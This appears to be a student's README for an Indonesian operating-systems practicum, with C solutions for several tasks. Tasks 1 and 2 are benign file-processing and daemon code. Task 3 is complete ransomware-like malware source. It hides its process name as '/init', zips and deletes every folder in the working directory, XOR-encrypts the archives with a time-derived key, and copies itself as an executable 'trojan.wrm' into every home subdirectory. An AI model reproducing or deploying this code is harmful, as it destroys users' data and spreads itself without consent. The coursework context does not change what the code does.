# Sisop-2-2025-IT18
# Soal 1
1. Import Library
<pre>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <curl/curl.h>

#define MAX_FILENAME 256
#define MAX_FILES 100
#define URL "https://drive.google.com/uc?export=download&id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK"

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

</pre>
* Fungsi ini dipanggil otomatis sama libcurl saat proses download berjalan.
* Tujuannya: Nulis data yang diterima ke dalam file (stream).
* ptr → pointer ke data hasil download.
* size * nmemb → total ukuran data yang ditulis.
* fwrite(...) → nulis data ke file (biasanya ke Clues.zip)

2. Fungsi Donwload dan Unzip
<pre>
    void download_and_unzip() {
    struct stat st = {0};
    if (stat("Clues", &st) == 0) {
        printf("Clues directory already exists. Skipping download.\n");
        return;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return;
    }

    FILE *fp = fopen("Clues.zip", "wb");
    if (!fp) {
        fprintf(stderr, "Failed to create Clues.zip\n");
        curl_easy_cleanup(curl);
        return;
    }

    curl_easy_setopt(curl, CURLOPT_URL, URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    CURLcode res = curl_easy_perform(curl);
    fclose(fp);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "Download failed: %s\n", curl_easy_strerror(res));
        remove("Clues.zip");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        execlp("unzip", "unzip", "Clues.zip", NULL);
        perror("execlp failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        wait(NULL);
        remove("Clues.zip");
    } else {
        perror("fork failed");
    }
}
</pre> 
* Cek apakah folder Clues sudah ada.
* Kalau belum, download file ZIP dari internet.
* Simpan sebagai Clues.zip.
* Lalu unzip isinya ke folder Clues.
* Hapus file zip-nya setelah selesai.

3. Fungsi Filter txt 1 huruf dan 1 angka
<pre>
void filter_files() {
    mkdir("Filtered", 0755);
    char path[MAX_FILENAME];
    struct dirent *ent;
    DIR *dir;

    for (char c = 'A'; c <= 'D'; c++) {
        snprintf(path, MAX_FILENAME, "Clues/Clue%c", c);
        dir = opendir(path);
        if (!dir) continue;

        while ((ent = readdir(dir)) != NULL) {
            char *filename = ent->d_name;
            if (filename[0] == '.') continue;

            int valid = 0;
            size_t len = strlen(filename);
            if (len == 5 && strcmp(filename + len - 4, ".txt") == 0) {
                char base = filename[0];
                if ((islower(base) || isdigit(base))) {
                    valid = 1;
                }
            }

            char src_path[MAX_FILENAME], dest_path[MAX_FILENAME];
            snprintf(src_path, MAX_FILENAME, "%s/%s", path, filename);

            if (valid) {
                snprintf(dest_path, MAX_FILENAME, "Filtered/%s", filename);
                rename(src_path, dest_path);
            } else {
                remove(src_path);
            }
        }

        closedir(dir);
    }
}
</pre>
* Loop ClueA–ClueD
* Baca semua file di sana
* Validasi nama file
* File valid → pindah ke Filtered/
* File gak valid → dihapus

4. Fungsi Combine sesuai urutan angka dan huruf
<pre>
void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        fprintf(stderr, "Filtered directory not found\n");
        return;
    }

    char *numbers[MAX_FILES], *letters[MAX_FILES];
    int n = 0, l = 0;
    struct dirent *ent;

    while ((ent = readdir(dir)) != NULL) {
        char *filename = ent->d_name;
        if (filename[0] == '.') continue;

        if (isdigit(filename[0])) {
            numbers[n++] = strdup(filename);
        } else if (isalpha(filename[0])) {
            letters[l++] = strdup(filename);
        }
    }
    closedir(dir);

    for (int i = 0; i < n - 1; i++) {
        for (int j = i + 1; j < n; j++) {
            if (atoi(numbers[i]) > atoi(numbers[j])) {
                char *tmp = numbers[i];
                numbers[i] = numbers[j];
                numbers[j] = tmp;
            }
        }
    }

    for (int i = 0; i < l - 1; i++) {
        for (int j = i + 1; j < l; j++) {
            if (strcmp(letters[i], letters[j]) > 0) {
                char *tmp = letters[i];
                letters[i] = letters[j];
                letters[j] = tmp;
            }
        }
    }

    FILE *combined = fopen("Combined.txt", "w");
    if (!combined) {
        perror("Failed to create Combined.txt");
        return;
    }

    int i = 0, j = 0;
    while (i < n || j < l) {
        if (i < n) {
            char path[MAX_FILENAME];
            snprintf(path, MAX_FILENAME, "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(numbers[i++]);
        }

        if (j < l) {
            char path[MAX_FILENAME];
            snprintf(path, MAX_FILENAME, "Filtered/%s", letters[j]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(letters[j++]);
        }
    }

    rmdir("Filtered");
    fclose(combined);
}
</pre>
* Buka folder Filtered/
* Memisahkan file jadi 2 grup
* Urutkan masing-masing grup (angka secara numerik, huruf secara alfabet)
* Menggambungkan file ke Combined.txt
* ulangi sampai habis
* Hapus file setelah digabung

5. Fungsi Rot13
<pre>
    void rot13(char *str) {
    for (; *str; str++) {
        if (isalpha(*str)) {
            if ((*str >= 'a' && *str <= 'm') || (*str >= 'A' && *str <= 'M')) {
                *str += 13;
            } else {
                *str -= 13;
            }
        }
    }
}
</pre>

6. Decode Combined.txt menggunakan fungsi Rot13
<pre>
    void decode_file() {
    FILE *combined = fopen("Combined.txt", "r");
    if (!combined) {
        fprintf(stderr, "Combined.txt not found\n");
        return;
    }

    fseek(combined, 0, SEEK_END);
    long size = ftell(combined);
    fseek(combined, 0, SEEK_SET);

    char *content = malloc(size + 1);
    if (!content) {
        perror("malloc failed");
        fclose(combined);
        return;
    }

    fread(content, 1, size, combined);
    content[size] = '\0';
    fclose(combined);

    rot13(content);

    FILE *decoded = fopen("Decoded.txt", "w");
    if (decoded) {
        fputs(content, decoded);
        fclose(decoded);
    } else {
        perror("Failed to create Decoded.txt");
    }

    free(content);
}
</pre>

7. Fungsi Main
<pre>
    int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_unzip();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            fprintf(stderr, "Invalid command.\n");
        }
    } else {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "  ./action                # Download & extract Clues.zip\n");
        fprintf(stderr, "  ./action -m Filter      # Filter files\n");
        fprintf(stderr, "  ./action -m Combine     # Gabungkan isi file\n");
        fprintf(stderr, "  ./action -m Decode      # Decode ROT13 hasilnya\n");
    }

    return 0;
}
</pre>

# Soal 2
1. Import library dan deklarasi direktori atau file
<pre>
     #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <openssl/evp.h>

#define STARTERKIT_DIR "starter_kit"
#define QUARANTINE_DIR "quarantine"
#define PID_FILE "decrypt.pid"
#define LOG_FILE "activity.log"
</pre>
2. Function daemon dan decode base64
<pre>
    void decrypt_daemon() {
    pid_t pid = fork();

    if (pid < 0) {
        perror("Failed to fork");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        printf("Daemon started with PID %d\n", pid);
        FILE *pid_file = fopen(PID_FILE, "w");
        if (!pid_file) {
            perror("Failed to write PID file");
            exit(EXIT_FAILURE);
        }
        fprintf(pid_file, "%d\n", pid);
        fclose(pid_file);

        char log_msg[100];
        snprintf(log_msg, sizeof(log_msg), "Successfully started decryption process with PID %d.", pid);
        log_activity(log_msg);

        exit(EXIT_SUCCESS);
    }

    setsid();
    chdir(".");
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);

    while (1) {
        DIR *dir = opendir(STARTERKIT_DIR);  
        if (!dir) {
            sleep(5);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                char old_path[512], new_path[512];
                snprintf(old_path, sizeof(old_path), "%s/%s", STARTERKIT_DIR, entry->d_name);

                char* decoded_name = decode_base64(entry->d_name);  
                if (decoded_name) {
                    snprintf(new_path, sizeof(new_path), "%s/decoded_%s", STARTERKIT_DIR, decoded_name);
                    rename(old_path, new_path);  
                    free(decoded_name);

                    char log_msg[600];
                    snprintf(log_msg, sizeof(log_msg), "%s - Successfully decrypted and renamed to %s", entry->d_name, decoded_name);
                    log_activity(log_msg);
                }
            }
        }

        closedir(dir);
        sleep(5);
    }
}
</pre>
<pre>
    char* decode_base64(const char* base64_input) {
    int length = strlen(base64_input);
    int decoded_length = (length * 3) / 4;  
    unsigned char *decoded_data = malloc(decoded_length + 1); 

    if (!decoded_data) {
        return NULL;
    }

    int actual_decoded_length = EVP_DecodeBlock(decoded_data, (const unsigned char*)base64_input, length);

    if (actual_decoded_length < 0) {
        free(decoded_data);
        return NULL;
    }

    decoded_data[actual_decoded_length] = '\0';

    return (char*)decoded_data;
}
</pre>
3. Function qurantine dan return file untuk mobilisasi file
   * Erorr handling untuk mengecek ketersediaan direkotri yang dituju
   <pre>
       int directory_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
   }
   </pre>
   * Function quarantine dan return file
   <pre>
       void move_files(const char *src, const char *dest, const char *action) {
    if (!directory_exists(src)) {
        fprintf(stderr, "Source directory %s does not exist.\n", src);
        return;
    }

    DIR *dir = opendir(src);
    if (!dir) {
        perror("Failed to open source directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char src_path[512], dest_path[512];
            snprintf(src_path, sizeof(src_path), "%s/%s", src, entry->d_name);
            snprintf(dest_path, sizeof(dest_path), "%s/%s", dest, entry->d_name);

            if (rename(src_path, dest_path) == 0) {
                char log_msg[600];
                snprintf(log_msg, sizeof(log_msg), "%s - Successfully %s", entry->d_name, action);
                log_activity(log_msg);
            } else {
                perror("Failed to move file");
                char log_msg[600];
                snprintf(log_msg, sizeof(log_msg), "%s - Failed to %s", entry->d_name, action);
                log_activity(log_msg);
            }
        }
    }
    closedir(dir);
</pre>
4. Function eradicate untuk menghapus seluruh file dalam code quarantine
<pre>
  void eradicate_files() {
    if (!directory_exists(QUARANTINE_DIR)) {
        fprintf(stderr, "Quarantine directory does not exist.\n");
        return;
    }

    DIR *dir = opendir(QUARANTINE_DIR);
    if (!dir) {
        perror("Failed to open quarantine directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char file_path[512];
            snprintf(file_path, sizeof(file_path), "%s/%s", QUARANTINE_DIR, entry->d_name);

            if (remove(file_path) == 0) {
                char log_msg[600];
                snprintf(log_msg, sizeof(log_msg), "%s - Successfully deleted.", entry->d_name);
                log_activity(log_msg);
            } else {
                perror("Failed to delete file");
                char log_msg[600];
                snprintf(log_msg, sizeof(log_msg), "%s - Failed to delete.", entry->d_name);
                log_activity(log_msg);
            }
        }
    }

    closedir(dir);
}
  </pre>
  5. Function shutdow untuk mematikan seluruh proses daemon yang berjalan
 <pre>
   void shutdown_daemon() {
    FILE *pid_file = fopen(PID_FILE, "r");
    if (!pid_file) {
        fprintf(stderr, "PID file not found.\n");
        return;
    }

    int pid;
    if (fscanf(pid_file, "%d", &pid) != 1) {
        fprintf(stderr, "Invalid PID format.\n");
        fclose(pid_file);
        return;
    }
    fclose(pid_file);

    if (kill(pid, SIGTERM) == 0) {
        char log_msg[100];
        snprintf(log_msg, sizeof(log_msg), "Successfully shut off decryption process with PID %d.", pid);
        log_activity(log_msg);
    } else {
        perror("Failed to kill process");
        char log_msg[100];
        snprintf(log_msg, sizeof(log_msg), "Failed to shut off decryption process with PID %d.", pid);
        log_activity(log_msg);
    }
}
 </pre>
 6.  Function timestamp untuk memberikan format waktu
 <pre>
 char *timestamp() {
    static char buffer[100];
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    strftime(buffer, sizeof(buffer), "[%d-%m-%Y][%H:%M:%S]", tm_info);
    return buffer;
}
</pre>
7. Log activity unutk mencatat segala aktivitas starterkit ke dalam file log
<pre>
     void log_activity(const char *message) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) {
        perror("Failed to open log file");
        return;
    }
    fprintf(log, "%s - %s\n", timestamp(), message);
    fclose(log);
}
   </pre>
   8. Fungsi main untuk menerima argumen dan memproses opsi yang telah dipilih
   <pre>
     int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s --decrypt | --quarantine | --return | --eradicate | --shutdown\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (strcmp(argv[1], "--decrypt") == 0) {
        decrypt_daemon();
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        move_files(STARTERKIT_DIR, QUARANTINE_DIR, "moved to quarantine directory");
    } else if (strcmp(argv[1], "--return") == 0) {
        move_files(QUARANTINE_DIR, STARTERKIT_DIR, "returned to starter kit directory");
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_files();
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_daemon();
    } else {
        fprintf(stderr, "Invalid argument.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
</pre>
<h3>Note untuk soal 2</h3>
Untuk error handling ketika ./starterkit --x, outputnya harus konsisten (seperti ini "Usage: %s --decrypt | --quarantine | --return | --eradicate | --shutdown\n")

# Soal 3
1. Import library yang diperlukan
<pre>
     #define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <libgen.h>
#include <zip.h>
#include <stdint.h>
#include <sys/wait.h>
</pre>
2. Function daemonize yang selalu berjalan di latar belakang
<pre>
     void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); 

    setsid();
    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
     }
</pre>
3. Function XOR untuk mengenkripsi seluruh file di dalam direktori dimana malware berada
<pre>
     void xor_file(const char *filepath, uint8_t key) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    rewind(fp);

    uint8_t *buffer = malloc(size);
    fread(buffer, 1, size, fp);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= key;
    }

    rewind(fp);
    fwrite(buffer, 1, size, fp);

    fclose(fp);
    free(buffer);
     }
</pre>
4. Mengubah seluruh file yang telah di enkripsi menjadi zip
<pre>
     char *zip_folder(const char *folderpath) {
    char zipname[1024];
    snprintf(zipname, sizeof(zipname), "%s.zip", folderpath);

    int errorp;
    zip_t *zip = zip_open(zipname, ZIP_CREATE | ZIP_TRUNCATE, &errorp);
    if (!zip) return NULL;

    DIR *dir;
    struct dirent *entry;
    char path[1024];

    if ((dir = opendir(folderpath)) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
                if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                    continue;

                snprintf(path, sizeof(path), "%s/%s", folderpath, entry->d_name);

                struct stat st;
                stat(path, &st);
                if (S_ISREG(st.st_mode)) {
                    zip_source_t *source = zip_source_file(zip, path, 0, 0);
                    if (source)
                        zip_file_add(zip, entry->d_name, source, ZIP_FL_OVERWRITE);
                }
            }
        }
        closedir(dir);
    }

    zip_close(zip);
    return strdup(zipname);
     }
</pre>
5. Menghapus file original yang sebelumnya telah dirubah menjadi ZIP
<pre>
        void delete_folder(const char *path) {
    DIR *d = opendir(path);
    size_t path_len = strlen(path);
    struct dirent *p;
    if (!d) return;

    while ((p = readdir(d))) {
        if (strcmp(p->d_name, ".") == 0 || strcmp(p->d_name, "..") == 0)
            continue;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, p->d_name);
        struct stat st;
        if (!stat(full_path, &st)) {
            if (S_ISDIR(st.st_mode)) {
                delete_folder(full_path);
            } else {
                remove(full_path);
            }
        }
    }
    closedir(d);
    rmdir(path);
     }
</pre>
6. Function wannacryptor
<pre>
        void wannacryptor() {
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    DIR *dir = opendir(cwd);
    struct dirent *entry;
    if (!dir) return;

    time_t t = time(NULL);
    uint8_t key = (uint8_t)(t % 256);

    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            char folderpath[1024];
            snprintf(folderpath, sizeof(folderpath), "%s/%s", cwd, entry->d_name);

            char *zipfile = zip_folder(folderpath);
            if (zipfile) {
                delete_folder(folderpath);
                xor_file(zipfile, key);
                free(zipfile);
            }
        }
    }
    closedir(dir);
     }
</pre>
7. Function spread malware untuk menyebarkan file malware dan trojan keseluruh direktori didalm direktori home
<pre>
     void spread_malware() {
    const char *home = getenv("HOME");
    if (!home) return;

    DIR *dir = opendir(home);
    struct dirent *entry;

    char self_path[1024];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) return;
    self_path[len] = '\0';

    if (!dir) return;
    while ((entry = readdir(dir))) {
        if (entry->d_type != DT_DIR) continue;
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char target_dir[1024];
        snprintf(target_dir, sizeof(target_dir), "%s/%s", home, entry->d_name);

        char target_path[1024];
        snprintf(target_path, sizeof(target_path), "%s/trojan.wrm", target_dir);

        FILE *src = fopen(self_path, "rb");
        FILE *dst = fopen(target_path, "wb");
        if (!src || !dst) {
            if (src) fclose(src);
            if (dst) fclose(dst);
            continue;
        }

        char buf[4096];
        size_t bytes;
        while ((bytes = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, bytes, dst);
        }

        fclose(src);
        fclose(dst);
        chmod(target_path, 0755);
    }
    closedir(dir);
     }
</pre>
8. Function main untuk menjalankan seluruh function diatas
<pre>
     int main() {
    daemonize();
    sleep(5);
    wannacryptor();
    spread_malware(); 
    while (1) sleep(10);
}
</pre>
<h3>Note untuk soal 3</h3>
kodenya bisa diselesaikan lagi sampai selesai.

# Soal 4
Pada soal  ini kita diminta untuk membuat sebuah program debugmon yang dapat memantau semua aktivitas di komputer.

1. Header dan Definisi
   <pre>
    #define _GNU_SOURCE

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <dirent.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <sys/types.h>
    #include <ctype.h>
    #include <signal.h>
    #include <time.h>
    #include <sys/stat.h></pre>

    * Mengaktifkan fitur tambahan dari GNU C Library
    * Header untuk operasi file, direktori, pengguna, sinyal, waktu, dan sebagainya

    
   
